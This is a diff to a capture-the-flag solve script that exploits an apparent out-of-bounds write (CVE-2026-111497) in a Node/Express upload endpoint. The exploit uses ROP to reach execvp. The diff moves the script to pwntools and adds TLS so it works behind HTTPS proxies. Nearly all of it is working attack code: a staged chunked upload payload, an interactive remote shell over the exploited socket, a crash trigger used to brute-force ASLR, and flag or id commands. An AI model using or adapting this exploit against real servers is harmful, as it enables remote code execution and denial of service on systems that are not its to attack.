@@ -38,6 +38,7 @@ Usage
 -----
     python3 solve.py                        # default: cat /flag.txt
     python3 solve.py --url http://host:port
+    python3 solve.py --url https://host/    # TLS is negotiated automatically
     python3 solve.py --mode shell           # interactive shell over the socket
     python3 solve.py --mode id              # just prove RCE (runs /usr/bin/id)
 
@@ -53,21 +54,22 @@ Modes
     id      dup2(19, 1) instead and exec /usr/bin/id.  Proves RCE without
             needing the shell trick at all.
 
-Stdlib only.  No third-party dependencies.
+Requires:  pip install pwntools
 """
 
 from __future__ import annotations
 
 import argparse
 import hashlib
-import os
 import re
-import selectors
-import socket
 import struct
 import sys
 import time
 from urllib.parse import urlsplit
+
+from pwn import context, remote
+
+context.log_level = "error"  # keep stdout clean
 
 # ---------------------------------------------------------------------------
 # Profile: node-24.22.0-express-5.3.0-bookworm-x86_64
@@ -340,22 +342,35 @@ def chunk(data: bytes) -> bytes:
 
 
 # ---------------------------------------------------------------------------
-# Networking
+# Networking  (pwntools tubes)
 # ---------------------------------------------------------------------------
 
 
-def connect(host: str, port: int, timeout: float) -> socket.socket:
-    connection = socket.create_connection((host, port), timeout=timeout)
-    connection.settimeout(timeout)
-    return connection
+def connect(host: str, port: int, timeout: float, tls: bool = False):
+    """Open a TCP tube to the target, wrapped in TLS when the URL is https.
+
+    Deployments are frequently fronted by a TLS-terminating proxy on 443 that
+    routes by SNI, so a plaintext request there is answered by the proxy (or
+    dropped) and never reaches the app.  pwntools' ``ssl=True`` performs the
+    handshake and leaves the tube byte-for-byte identical afterwards, so the
+    exploit payload is unchanged either way.
+    """
+    return remote(host, port, timeout=timeout, ssl=tls)
 
 
-def read_until(connection: socket.socket, deadline: float, limit: int = 65536) -> bytes:
+def read_until(tube, deadline: float, limit: int = 65536) -> bytes:
+    """Drain the tube until we hit a stop marker, EOF, or the deadline.
+
+    pwntools raises EOFError when the worker dies mid-read, which is the
+    normal outcome of a missed ASLR guess -- so EOF is a result, not an
+    exception we should surface.
+    """
     data = bytearray()
     while len(data) < limit and time.monotonic() < deadline:
+        remaining = max(0.05, deadline - time.monotonic())
         try:
-            part = connection.recv(min(4096, limit - len(data)))
-        except (socket.timeout, OSError):
+            part = tube.recv(min(4096, limit - len(data)), timeout=remaining)
+        except (EOFError, OSError):
             break
         if not part:
             break
@@ -365,23 +380,37 @@ def read_until(connection: socket.socket, deadline: float, limit: int = 65536) -
     return bytes(data)
 
 
-def healthcheck(host: str, port: int, timeout: float) -> bool:
+def healthcheck(host: str, port: int, timeout: float, tls: bool = False) -> bool:
     """Our /health returns {"status":"ok"}, not the upstream lab's PONG."""
+    tube = None
     try:
-        with connect(host, port, timeout) as connection:
-            connection.sendall(
-                b"GET /health HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n"
-            )
-            response = read_until(connection, time.monotonic() + timeout, limit=4096)
-    except OSError:
+        tube = connect(host, port, timeout, tls)
+        tube.send(
+            b"GET /health HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n"
+        )
+        response = read_until(tube, time.monotonic() + timeout, limit=4096)
+    except (EOFError, OSError):
         return False
+    finally:
+        if tube is not None:
+            try:
+                tube.close()
+            except Exception:  # noqa: BLE001 - closing must never mask a result
+                pass
     return response.startswith(b"HTTP/1.1 200") and b'"ok"' in response
 
 
-def wait_until(host: str, port: int, timeout: float, want: bool, budget: float) -> bool:
+def wait_until(
+    host: str,
+    port: int,
+    timeout: float,
+    want: bool,
+    budget: float,
+    tls: bool = False,
+) -> bool:
     deadline = time.monotonic() + budget
     while time.monotonic() < deadline:
-        if healthcheck(host, port, min(timeout, 1.0)) == want:
+        if healthcheck(host, port, min(timeout, 1.0), tls) == want:
             return True
         time.sleep(0.1)
     return False
@@ -394,12 +423,10 @@ def exploit_once(
     path: str,
     dup_fd: int,
     command: str | None,
+    tls: bool = False,
 ) -> bytes:
     """One attempt.  Returns whatever came back on the exploited socket."""
-    stages = {
-        position: build_stages(path, dup_fd, position)
-        for position in STAGED_POSITIONS
-    }
+    first, second = build_stages(path, dup_fd, STAGED_POSITIONS[0])
     headers = (
         b"POST /upload HTTP/1.1\r\n"
         b"Host: target\r\n"
@@ -409,39 +436,36 @@ def exploit_once(
         b"Connection: close\r\n\r\n"
     )
 
-    position = STAGED_POSITIONS[0]
-    first, second = stages[position]
-
-    with connect(host, port, timeout) as connection:
-        connection.sendall(headers + chunk(first))
+    with connect(host, port, timeout, tls) as tube:
+        tube.send(headers + chunk(first))
         time.sleep(STAGE_DELAY_SECONDS)
-        connection.sendall(chunk(second) + b"0\r\n\r\n")
+        tube.send(chunk(second) + b"0\r\n\r\n")
 
         if command is None:
-            # /usr/bin id writes straight to the dup'd stdout.
-            return read_until(connection, time.monotonic() + timeout)
+            # /usr/bin/id writes straight to the dup'd stdout.
+            return read_until(tube, time.monotonic() + timeout)
 
         # Give the exec'd shell a moment to come up and read its stdin,
         # then hand it the command over the same socket.
         time.sleep(0.4)
         try:
-            connection.sendall(command.encode("ascii") + b"\n")
-        except OSError:
+            tube.send(command.encode("ascii") + b"\n")
+        except (EOFError, OSError):
             return b""
-        return read_until(connection, time.monotonic() + timeout, limit=65536)
+        return read_until(tube, time.monotonic() + timeout, limit=65536)
 
 
 def exploit_interactive(
     host: str,
     port: int,
     timeout: float,
-) -> socket.socket | None:
-    """Fire the exploit and return a socket with a live shell on it, or None.
-
+    tls: bool = False,
+) -> bool:
+    """
     The bootstrap promotes the exploited socket to stdout/stderr and re-execs
     as an interactive shell, so both our keystrokes and the shell's output
-    travel over the same connection.  Returns None when the worker died or the
-    ASLR guess missed, which the caller treats like any other failed attempt.
+    travel over the same connection.  Returns True once the shell has been
+    handed to the user, or False when the worker died / the ASLR guess missed.
     """
     first, second = build_stages(SHELL_PATH, 0, STAGED_POSITIONS[0])
     headers = (
@@ -453,95 +477,41 @@ def exploit_interactive(
         b"Connection: close\r\n\r\n"
     )
 
-    connection = connect(host, port, timeout)
+    tube = connect(host, port, timeout, tls)
     try:
-        connection.sendall(headers + chunk(first))
+        tube.send(headers + chunk(first))
         time.sleep(STAGE_DELAY_SECONDS)
-        connection.sendall(chunk(second) + b"0\r\n\r\n")
-    except OSError:
-        connection.close()
-        return None
+        tube.send(chunk(second) + b"0\r\n\r\n")
+    except (EOFError, OSError):
+        tube.close()
+        return False
 
     # The shell reads its first command from the same socket.
     time.sleep(0.4)
     try:
-        connection.sendall(INTERACTIVE_COMMAND.encode("ascii") + b"\n")
-    except OSError:
-        connection.close()
-        return None
+        tube.send(INTERACTIVE_COMMAND.encode("ascii") + b"\n")
+    except (EOFError, OSError):
+        tube.close()
+        return False
 
     # Wait for the bootstrap to announce itself.  A miss means the worker is
     # gone (or never got that far), so there is nothing to attach to.
-    banner = read_until(
-        connection, time.monotonic() + min(timeout, 10.0), limit=65536
-    )
+    banner = read_until(tube, time.monotonic() + min(timeout, 10.0), limit=65536)
     if SHELL_PROMPT_MARKER.encode("ascii") not in banner:
-        connection.close()
-        return None
+        tube.close()
+        return False
 
-    connection.settimeout(None)
     if banner:
-        os.write(sys.stdout.fileno(), banner)
-    return connection
+        sys.stdout.buffer.write(banner)
+        sys.stdout.buffer.flush()
+
+    # pwntools relays our terminal to the socket and back.  Ctrl-C detaches.
+    tube.interactive()
+    tube.close()
+    return True
 
 
-def relay_shell(connection: socket.socket) -> None:
-    """Pump local stdin to the shell and the shell's output back to stdout.
-
-    No PTY is allocated -- the 11-qword ROP budget cannot afford openpty and
-    its argument marshalling -- so this is a raw bidirectional stream.  The
-    shell is still interactive; it just has no tty, which means no tab
-    completion and no job control.
-    """
-    stdin_fd = sys.stdin.fileno()
-    selector = selectors.DefaultSelector()
-    selector.register(connection, selectors.EVENT_READ, "sock")
-    selector.register(stdin_fd, selectors.EVENT_READ, "stdin")
-
-    try:
-        while True:
-            for key, _ in selector.select():
-                if key.data == "sock":
-                    try:
-                        data = connection.recv(4096)
-                    except OSError:
-                        return
-                    if not data:
-                        return
-                    os.write(sys.stdout.fileno(), data)
-                else:
-                    data = os.read(stdin_fd, 4096)
-                    if not data:
-                        # Local EOF (Ctrl-D, or a piped script ran out).  Ask
-                        # the shell to exit, then keep draining so whatever it
-                        # already printed is not lost to the close.
-                        try:
-                            connection.sendall(b"exit\n")
-                        except OSError:
-                            return
-                        try:
-                            connection.shutdown(socket.SHUT_WR)
-                        except OSError:
-                            pass
-                        while True:
-                            try:
-                                rest = connection.recv(4096)
-                            except OSError:
-                                return
-                            if not rest:
-                                return
-                            os.write(sys.stdout.fileno(), rest)
-                    try:
-                        connection.sendall(data)
-                    except OSError:
-                        return
-    except KeyboardInterrupt:
-        pass
-    finally:
-        selector.close()
-
-
-def crash_trigger(host: str, port: int, timeout: float) -> None:
+def crash_trigger(host: str, port: int, timeout: float, tls: bool = False) -> None:
     """Fire the DoS payload so the restart supervisor respawns a fresh worker.
 
     Each respawn re-randomises ASLR, which is what lets us retry the
@@ -557,15 +527,15 @@ def crash_trigger(host: str, port: int, timeout: float) -> None:
         b"Connection: close\r\n\r\n"
     )
     try:
-        with connect(host, port, timeout) as connection:
-            connection.sendall(headers + chunk(first))
+        with connect(host, port, timeout, tls) as tube:
+            tube.send(headers + chunk(first))
             time.sleep(STAGE_DELAY_SECONDS)
             try:
-                connection.sendall(chunk(second) + b"0\r\n\r\n")
-            except OSError:
+                tube.send(chunk(second) + b"0\r\n\r\n")
+            except (EOFError, OSError):
                 return
-            read_until(connection, time.monotonic() + 2.0, limit=4096)
-    except OSError:
+            read_until(tube, time.monotonic() + 2.0, limit=4096)
+    except (EOFError, OSError):
         pass  # a successful crash aborts the trigger connection
 
 
@@ -587,12 +557,17 @@ def solve(url: str, timeout: float, attempts: int, mode: str) -> int:
         print(f"FAIL: could not parse target from {url!r}", file=sys.stderr)
         return 1
 
+    # https implies a TLS-terminating front end; without this the exploit
+    # bytes hit the proxy instead of Express.
+    tls = parts.scheme == "https"
+
     print(f"[*] target      : {host}:{port}")
+    print(f"[*] transport   : {'https (TLS)' if tls else 'http'}")
     print(f"[*] runtime     : node v24.22.0 linux/x64 (non-PIE)")
     print(f"[*] primitive   : CVE-2026-111497 OOB write -> ROP -> execvp")
     print(f"[*] mode        : {mode}")
 
-    if not healthcheck(host, port, timeout):
+    if not healthcheck(host, port, timeout, tls):
         print("FAIL: target /health did not respond before the attempt", file=sys.stderr)
         return 1
     print("[+] target healthy")
@@ -606,24 +581,24 @@ def solve(url: str, timeout: float, attempts: int, mode: str) -> int:
 
     last = b""
     for attempt in range(1, attempts + 1):
-        if not wait_until(host, port, timeout, True, RESTART_TIMEOUT_SECONDS):
+        if not wait_until(
+            host, port, timeout, True, RESTART_TIMEOUT_SECONDS, tls
+        ):
             print("FAIL: target never became healthy for a fresh attempt", file=sys.stderr)
             return 1
 
         print(f"[*] attempt {attempt}/{attempts}  path={path}  dup2 fd={dup_fd}")
         try:
             if mode == "shell":
-                live = exploit_interactive(host, port, timeout)
-                if live is not None:
-                    print("[+] shell attached — Ctrl-D to detach", file=sys.stderr)
-                    relay_shell(live)
-                    live.close()
-                    print("[*] detached", file=sys.stderr)
+                if exploit_interactive(host, port, timeout, tls):
+                    print("[+] detached", file=sys.stderr)
                     return 0
                 last = b""
             else:
-                last = exploit_once(host, port, timeout, path, dup_fd, command)
-        except OSError as error:
+                last = exploit_once(
+                    host, port, timeout, path, dup_fd, command, tls
+                )
+        except (EOFError, OSError) as error:
             print(f"    connection failed: {error}")
             last = b""
 
@@ -649,8 +624,8 @@ def solve(url: str, timeout: float, attempts: int, mode: str) -> int:
 
         if attempt < attempts:
             # Restart the worker to re-roll ASLR, then wait for it to come back.
-            crash_trigger(host, port, timeout)
-            if not wait_until(host, port, timeout, False, 3.0):
+            crash_trigger(host, port, timeout, tls)
+            if not wait_until(host, port, timeout, False, 3.0, tls):
                 print("    crash trigger did not take the worker down", file=sys.stderr)
 
     print(
@@ -664,8 +639,6 @@ def solve(url: str, timeout: float, attempts: int, mode: str) -> int:
 
 def main() -> int:
     parser = argparse.ArgumentParser(description="Shelloween solve (CVE-2026-111497)")
-    parser.add_argument("host", nargs="?", help="target host (positional; with PORT)")
-    parser.add_argument("port", nargs="?", help="target port (positional; with HOST)")
     parser.add_argument("--url", default=DEFAULT_URL, help="target base URL")
     parser.add_argument("--timeout", type=float, default=30.0)
     parser.add_argument("--attempts", type=int, default=ATTEMPTS)
@@ -676,11 +649,6 @@ def main() -> int:
         help="flag = cat /flag.txt (default); shell = interactive shell; id = prove RCE",
     )
     args = parser.parse_args()
-    if args.host and args.port:
-        args.url = "http://%s:%s" % (args.host, args.port)
-    elif args.host or args.port:
-        print("FAIL: provide both HOST and PORT, or use --url", file=sys.stderr)
-        return 1
     if not 0 < args.timeout <= 120:
         print("FAIL: timeout must be in (0, 120]", file=sys.stderr)
         return 1
